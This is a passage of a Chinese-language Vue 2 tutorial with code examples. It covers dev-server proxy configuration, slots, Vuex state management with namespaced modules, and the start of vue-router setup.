中添加如下配置：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">devServer</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">proxy</span><span class="token operator">:</span> <span class="token string">'http://localhost:5000'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>说明：</p><ol><li>优点：配置简单，请求资源时直接发给前端（8080）即可。</li><li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理。</li><li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</li></ol><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>编写 vue.config.js 配置具体代理规则：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">devServer</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">proxy</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token string-property property">'/api1'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 匹配所有以 '/api1'开头的请求路径</span>        <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'http://localhost:5000'</span><span class="token punctuation">,</span> <span class="token comment">// 代理目标的基础路径</span>        <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">'^/api1'</span><span class="token operator">:</span> <span class="token string">''</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token string-property property">'/api2'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 匹配所有以 '/api2'开头的请求路径</span>        <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'http://localhost:5001'</span><span class="token punctuation">,</span> <span class="token comment">// 代理目标的基础路径</span>        <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">'^/api2'</span><span class="token operator">:</span> <span class="token string">''</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/*   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080   changeOrigin默认值为true*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明：</p><ol><li>优点：可以配置多个代理，且可以灵活的控制请求是否走代理。</li><li>缺点：配置略微繁琐，请求资源时必须加前缀。</li></ol><h2 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h2><ol><li><p>作用：让父组件可以向子组件指定位置插入 html 结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 &#x3D;&#x3D;&#x3D;&gt; 子组件</strong> 。</p></li><li><p>分类：默认插槽、具名插槽、作用域插槽</p></li><li><p>使用方式：</p><ol><li><p>默认插槽：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">父组件中：&lt;Category&gt;           &lt;div&gt;html结构1&lt;&#x2F;div&gt;        &lt;&#x2F;Category&gt;子组件中：&lt;template&gt;  &lt;div&gt;    &lt;!-- 定义插槽 --&gt;    &lt;slot&gt;插槽默认内容...&lt;&#x2F;slot&gt;  &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>具名插槽：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">父组件中：&lt;Category&gt;            &lt;template slot&#x3D;&quot;center&quot;&gt;              &lt;div&gt;html结构1&lt;&#x2F;div&gt;            &lt;&#x2F;template&gt;            &lt;template v-slot:footer&gt;               &lt;div&gt;html结构2&lt;&#x2F;div&gt;            &lt;&#x2F;template&gt;        &lt;&#x2F;Category&gt;子组件中：&lt;template&gt;  &lt;div&gt;    &lt;!-- 定义插槽 --&gt;    &lt;slot name&#x3D;&quot;center&quot;&gt;插槽默认内容...&lt;&#x2F;slot&gt;    &lt;slot name&#x3D;&quot;footer&quot;&gt;插槽默认内容...&lt;&#x2F;slot&gt;  &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>作用域插槽：</p><ol><li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games 数据在 Category 组件中，但使用数据所遍历出来的结构由 App 组件决定）</p></li><li><p>具体编码：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">父组件中：&lt;Category&gt;         &lt;template scope&#x3D;&quot;scopeData&quot;&gt;            &lt;!-- 生成的是ul列表 --&gt;            &lt;ul&gt;               &lt;li v-for&#x3D;&quot;g in scopeData.games&quot; :key&#x3D;&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;&#x2F;li&gt;            &lt;&#x2F;ul&gt;         &lt;&#x2F;template&gt;      &lt;&#x2F;Category&gt;&lt;Category&gt;         &lt;template slot-scope&#x3D;&quot;scopeData&quot;&gt;            &lt;!-- 生成的是h4标题 --&gt;            &lt;h4 v-for&#x3D;&quot;g in scopeData.games&quot; :key&#x3D;&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;&#x2F;h4&gt;         &lt;&#x2F;template&gt;      &lt;&#x2F;Category&gt;子组件中：&lt;template&gt;  &lt;div&gt;    &lt;slot :games&#x3D;&quot;games&quot;&gt;&lt;&#x2F;slot&gt;  &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123;  name: &#39;Category&#39;,  props: [&#39;title&#39;],  &#x2F;&#x2F;数据在子组件自身  data() &#123;    return &#123;      games: [&#39;红色警戒&#39;, &#39;穿越火线&#39;, &#39;劲舞团&#39;, &#39;超级玛丽&#39;],    &#125;;  &#125;,&#125;;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ol><pre class="line-numbers language-none"><code class="language-none">   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p> 在 Vue 中实现集中式状态（数据）管理的一个 Vue 插件，对 vue 应用中多个组件的共享状态进行集中式的管理（读&#x2F;写），也是一种组件间通信的方式，且适用于任意组件间通信。</p><p><img src="/2023/04/10/vue/vuex.png" alt="vuex"></p><h3 id="2-何时使用？"><a href="#2-何时使用？" class="headerlink" title="2.何时使用？"></a>2.何时使用？</h3><p> 多个组件需要共享数据时</p><h3 id="3-搭建-vuex-环境"><a href="#3-搭建-vuex-环境" class="headerlink" title="3.搭建 vuex 环境"></a>3.搭建 vuex 环境</h3><ol><li><p>创建文件：<code>src/store/index.js</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//引入Vue核心库</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token punctuation">;</span><span class="token comment">//引入Vuex</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'vuex'</span><span class="token punctuation">;</span><span class="token comment">//应用Vuex插件</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Vuex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//准备actions对象——响应组件中用户的动作</span><span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//准备mutations对象——修改state中的数据</span><span class="token keyword">const</span> mutations <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//准备state对象——保存具体的数据</span><span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  actions<span class="token punctuation">,</span>  mutations<span class="token punctuation">,</span>  state<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在<code>main.js</code>中创建 vm 时传入<code>store</code>配置项</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token operator">...</span><span class="token comment">//引入store</span><span class="token keyword">import</span> store <span class="token keyword">from</span> <span class="token string">'./store'</span><span class="token operator">...</span><span class="token operator">...</span><span class="token comment">//创建vm</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>   <span class="token literal-property property">el</span><span class="token operator">:</span><span class="token string">'#app'</span><span class="token punctuation">,</span>   <span class="token function-variable function">render</span><span class="token operator">:</span> <span class="token parameter">h</span> <span class="token operator">=></span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span><span class="token punctuation">,</span>   store<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="4-基本使用"><a href="#4-基本使用" class="headerlink" title="4.基本使用"></a>4.基本使用</h3><ol><li><p>初始化数据、配置<code>actions</code>、配置<code>mutations</code>，操作文件<code>store.js</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//引入Vue核心库</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token punctuation">;</span><span class="token comment">//引入Vuex</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'vuex'</span><span class="token punctuation">;</span><span class="token comment">//引用Vuex</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Vuex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//响应组件中加的动作</span>  <span class="token function">jia</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// console.log('actions中的jia被调用了',miniStore,value)</span>    context<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'JIA'</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> mutations <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//执行加</span>  <span class="token constant">JIA</span><span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// console.log('mutations中的JIA被调用了',state,value)</span>    state<span class="token punctuation">.</span>sum <span class="token operator">+=</span> value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//初始化数据</span><span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">sum</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  actions<span class="token punctuation">,</span>  mutations<span class="token punctuation">,</span>  state<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>组件中读取 vuex 中的数据：<code>$store.state.sum</code></p></li><li><p>组件中修改 vuex 中的数据：<code>$store.dispatch(&#39;action中的方法名&#39;,数据)</code> 或 <code>$store.commit(&#39;mutations中的方法名&#39;,数据)</code></p><blockquote><p>备注：若没有网络请求或其他业务逻辑，组件中也可以越过 actions，即不写<code>dispatch</code>，直接编写<code>commit</code></p></blockquote></li></ol><h3 id="5-getters-的使用"><a href="#5-getters-的使用" class="headerlink" title="5.getters 的使用"></a>5.getters 的使用</h3><ol><li><p>概念：当 state 中的数据需要经过加工后再使用时，可以使用 getters 加工。</p></li><li><p>在<code>store.js</code>中追加<code>getters</code>配置</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">const</span> getters <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   <span class="token function">bigSum</span><span class="token punctuation">(</span><span class="token parameter">state</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> state<span class="token punctuation">.</span>sum <span class="token operator">*</span> <span class="token number">10</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>   <span class="token operator">...</span><span class="token operator">...</span>   getters<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>组件中读取数据：<code>$store.getters.bigSum</code></p></li></ol><h3 id="6-四个-map-方法的使用"><a href="#6-四个-map-方法的使用" class="headerlink" title="6.四个 map 方法的使用"></a>6.四个 map 方法的使用</h3><ol><li><p><strong>mapState 方法：</strong>用于帮助我们映射<code>state</code>中的数据为计算属性</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">computed</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//借助mapState生成计算属性：sum、school、subject（对象写法）</span>     <span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">sum</span><span class="token operator">:</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token literal-property property">school</span><span class="token operator">:</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token literal-property property">subject</span><span class="token operator">:</span><span class="token string">'subject'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">//借助mapState生成计算属性：sum、school、subject（数组写法）</span>    <span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token string">'subject'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mapGetters 方法：</strong>用于帮助我们映射<code>getters</code>中的数据为计算属性</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">computed</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//借助mapGetters生成计算属性：bigSum（对象写法）</span>    <span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">bigSum</span><span class="token operator">:</span><span class="token string">'bigSum'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">//借助mapGetters生成计算属性：bigSum（数组写法）</span>    <span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'bigSum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mapActions 方法：</strong>用于帮助我们生成与<code>actions</code>对话的方法，即：包含<code>$store.dispatch(xxx)</code>的函数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">methods</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token comment">//靠mapActions生成：incrementOdd、incrementWait（对象形式）</span>    <span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">incrementOdd</span><span class="token operator">:</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span><span class="token literal-property property">incrementWait</span><span class="token operator">:</span><span class="token string">'jiaWait'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment">//靠mapActions生成：incrementOdd、incrementWait（数组形式）</span>    <span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span><span class="token string">'jiaWait'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mapMutations 方法：</strong>用于帮助我们生成与<code>mutations</code>对话的方法，即：包含<code>$store.commit(xxx)</code>的函数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">methods</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token comment">//靠mapActions生成：increment、decrement（对象形式）</span>    <span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">increment</span><span class="token operator">:</span><span class="token string">'JIA'</span><span class="token punctuation">,</span><span class="token literal-property property">decrement</span><span class="token operator">:</span><span class="token string">'JIAN'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">//靠mapMutations生成：JIA、JIAN（对象形式）</span>    <span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'JIA'</span><span class="token punctuation">,</span><span class="token string">'JIAN'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><blockquote><p>备注：mapActions 与 mapMutations 使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。</p></blockquote><h3 id="7-模块化-命名空间"><a href="#7-模块化-命名空间" class="headerlink" title="7.模块化+命名空间"></a>7.模块化+命名空间</h3><ol><li><p>目的：让代码更好维护，让多种数据分类更加明确。</p></li><li><p>修改<code>store.js</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> countAbout <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">namespaced</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//开启命名空间</span>  <span class="token literal-property property">state</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">x</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">mutations</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">actions</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">getters</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token function">bigSum</span><span class="token punctuation">(</span><span class="token parameter">state</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> state<span class="token punctuation">.</span>sum <span class="token operator">*</span> <span class="token number">10</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> personAbout <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">namespaced</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//开启命名空间</span>  <span class="token literal-property property">state</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">mutations</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">actions</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> store <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token literal-property property">modules</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    countAbout<span class="token punctuation">,</span>    personAbout  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中读取 state 数据：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//方式一：自己直接读取</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>state<span class="token punctuation">.</span>personAbout<span class="token punctuation">.</span>list<span class="token comment">//方式二：借助mapState读取：</span><span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token string">'subject'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中读取 getters 数据：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//方式一：自己直接读取</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>getters<span class="token punctuation">[</span><span class="token string">'personAbout/firstPersonName'</span><span class="token punctuation">]</span><span class="token comment">//方式二：借助mapGetters读取：</span><span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'bigSum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中调用 dispatch</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//方式一：自己直接dispatch</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'personAbout/addPersonWang'</span><span class="token punctuation">,</span>person<span class="token punctuation">)</span><span class="token comment">//方式二：借助mapActions：</span><span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">incrementOdd</span><span class="token operator">:</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span><span class="token literal-property property">incrementWait</span><span class="token operator">:</span><span class="token string">'jiaWait'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中调用 commit</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//方式一：自己直接commit</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'personAbout/ADD_PERSON'</span><span class="token punctuation">,</span>person<span class="token punctuation">)</span><span class="token comment">//方式二：借助mapMutations：</span><span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">increment</span><span class="token operator">:</span><span class="token string">'JIA'</span><span class="token punctuation">,</span><span class="token literal-property property">decrement</span><span class="token operator">:</span><span class="token string">'JIAN'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><ol><li>理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。</li><li>前端路由：key 是路径，value 是组件。</li></ol><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1.基本使用"></a>1.基本使用</h3><ol><li><p>安装 vue-router，命令：<code>npm i vue-router</code></p></li><li><p>应用插件：<code>Vue.use(VueRouter)</code></p></li><li><p>编写 router 配置项:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//引入VueRouter</span><span class="token keyword">import</span> VueRouter <span class="token keyword">from</span> <span class="token string">'vue-router'</span><span class="token punctuation">;</span><span class="token comment">//引入Luyou 组件</span><span class="token keyword">import</span> About <span class="token keyword">from</span> <span class="token string">'../components/About'</span><span class="token punctuation">;</span><span class="token keyword">import</span> Home <span class="token keyword">from</span> <span class="token string">'../components/Home'</span><span class="token punctuation">;</span><span class="token comment">//创建router实例对象，去管理一组一组的路由规则</span><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token literal-property property">routes</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/about'</span><span class="token punctuation">,</span>      <span class="token literal-property property">component</span><span class="token operator">:</span> About<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>      <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/home'</span><span class="token punctuation">,</span>      <span class="token literal-property property">component</span><span class="token operator">:</span> Home<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//暴露router</span><span class="token keyword">export</span> <span class="token keyword">default</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实现切换（active-class 可配置高亮样式）</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;router-link 